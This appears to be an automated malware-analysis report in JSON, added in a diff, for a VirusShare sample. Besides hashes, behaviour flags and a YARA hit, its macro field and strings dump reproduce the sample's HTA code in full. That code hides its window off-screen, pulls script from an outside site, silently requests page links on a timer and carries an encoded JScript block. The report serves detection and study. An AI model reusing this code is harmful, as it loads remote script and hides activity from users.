@@ -1,0 +1,87 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Chr": "May attempt to obfuscate specific str",
+            "Microsoft.XMLHTTP": "May download files from the Internet",
+            "createobject": "May create an OLE object",
+            "open": "May open a file"
+        },
+        "macro": "<Script>self.moveTo(screen.Width + 800,screen.Height + 600);</Script>\n<html>\n<head>\n<hta:application showintaskbar='no'>\n</head>\n<body onload='start()'>\n<Script Language=\"VBScript\">\nFunction bytes2BSTR(vIn) \n\tdim strReturn \n\tdim i,ThisCharCode,NextCharCode \n\tstrReturn = \"\" \n\tFor i = 1 To LenB(vIn) \n\t\tThisCharCode = AscB(MidB(vIn,i,1)) \n\t\tIf ThisCharCode < &H80 Then \n\t\t\tstrReturn = strReturn & Chr(ThisCharCode) \n\t\tElse \n\t\t\tNextCharCode = AscB(MidB(vIn,i+1,1)) \n\t\t\tstrReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) \n\t\t\ti = i + 1 \n\t\tEnd If \n\tNext \n\tbytes2BSTR = strReturn \nEnd Function\nFunction OpenHttp(Url)\n\tOn Error Resume Next\n\tset Http = createobject(\"Microsoft.XMLHTTP\")\n\tHttp.open \"GET\",Url,false\n\tHttp.send()\nEnd Function\n</Script>\n<script language=JavaScript src=http://www.maguan.net></script>\n<script language=JavaScript src=http://www.maguan.net></script>\n<Script Language='JavaScript'>\nsetTimeout(\"window.open('http://www.maguan.net');\",1200000);\nvar dd = 3;\nfunction start() {\nif (dd < document.links.length) {\nOpenHttp(document.links[dd].href);\ndd++;setTimeout('start()',1000*30);\n}\nelse window.close();\n}\n</Script>\n<Script Language='JScript.Encode'>#@~^ZwAAAA==[Km;s+\tYRSDbO+vJ@!?1Dr2DPSmUo!lo\u007fxwJxl7ljm.raYwJ,jD1'wE4YY2lJzAhS XXTZFcmWsz4CwaX Lk-E@*@!-zU^DbwY@*EbiHCIAAA==^#~@</Script>\n</body></html>"
+    },
+    "filename": "VirusShare_2030643cc2c5e085bfdb431bd6e014ee",
+    "filesize": 1390,
+    "filetype": "data",
+    "hashes": {
+        "md5": "2030643cc2c5e085bfdb431bd6e014ee",
+        "sha1": "d5e4d3989ebb9b087d64b0df341eb0f69ac612b4",
+        "sha256": "670f9ca305a094f422a3b23754753627696de8e3af08e6247305a2b9c6a1e467"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<Script>self.moveTo(screen.Width + 800,screen.Height + 600);</Script>",
+            "<html>",
+            "<head>",
+            "<hta:application showintaskbar='no'>",
+            "</head>",
+            "<body onload='start()'>",
+            "<Script Language=\"VBScript\">",
+            "Function bytes2BSTR(vIn) ",
+            "\tdim strReturn ",
+            "\tdim i,ThisCharCode,NextCharCode ",
+            "\tstrReturn = \"\" ",
+            "\tFor i = 1 To LenB(vIn) ",
+            "\t\tThisCharCode = AscB(MidB(vIn,i,1)) ",
+            "\t\tIf ThisCharCode < &H80 Then ",
+            "\t\t\tstrReturn = strReturn & Chr(ThisCharCode) ",
+            "\t\tElse ",
+            "\t\t\tNextCharCode = AscB(MidB(vIn,i+1,1)) ",
+            "\t\t\tstrReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) ",
+            "\t\t\ti = i + 1 ",
+            "\t\tEnd If ",
+            "\tNext ",
+            "\tbytes2BSTR = strReturn ",
+            "End Function",
+            "Function OpenHttp(Url)",
+            "\tOn Error Resume Next",
+            "\tset Http = createobject(\"Microsoft.XMLHTTP\")",
+            "\tHttp.open \"GET\",Url,false",
+            "\tHttp.send()",
+            "End Function",
+            "</Script>",
+            "<script language=JavaScript src=http://www.maguan.net></script>",
+            "<script language=JavaScript src=http://www.maguan.net></script>",
+            "<Script Language='JavaScript'>",
+            "setTimeout(\"window.open('http://www.maguan.net');\",1200000);",
+            "var dd = 3;",
+            "function start() {",
+            "if (dd < document.links.length) {",
+            "OpenHttp(document.links[dd].href);",
+            "dd++;setTimeout('start()',1000*30);",
+            "else window.close();",
+            "</Script>",
+            "<Script Language='JScript.Encode'>#@~^ZwAAAA==[Km;s+\tYRSDbO+vJ@!?1Dr2DPSmUo!lo",
+            "xwJxl7ljm.raYwJ,jD1'wE4YY2lJzAhS XXTZFcmWsz4CwaX Lk-E@*@!-zU^DbwY@*EbiHCIAAA==^#~@</Script>",
+            "</body></html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.maguan.net"
+        ]
+    },
+    "time": "0:00:00.286410",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": [
+        {
+            "Maldoc_Contains_VBE_File.yar": "Contains_VBE_File"
+        }
+    ]
+}
